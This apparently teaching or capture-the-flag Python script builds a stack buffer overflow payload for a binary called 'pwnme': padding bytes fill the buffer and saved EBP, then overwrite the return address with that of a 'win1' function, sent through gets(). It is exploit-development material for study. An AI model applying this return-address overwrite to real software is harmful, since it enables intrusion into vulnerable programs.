#!/usr/bin/env python3
# usage: python3 vanilla_demo.py | ./pwnme

import sys

# Create your bytes data
payload = b''

payload += b'A' * 16 # fill the buffer
payload += b'B' * 8  # overwrite some other misc data on the stack
payload += b'C' * 4  # padding for ebp
payload += b'\xf3\x91\x04\x08'  # win1 function address is 0x80491f3
payload += b'\n'     # ending newline to terminate gets() read


sys.stdout.buffer.write(payload)
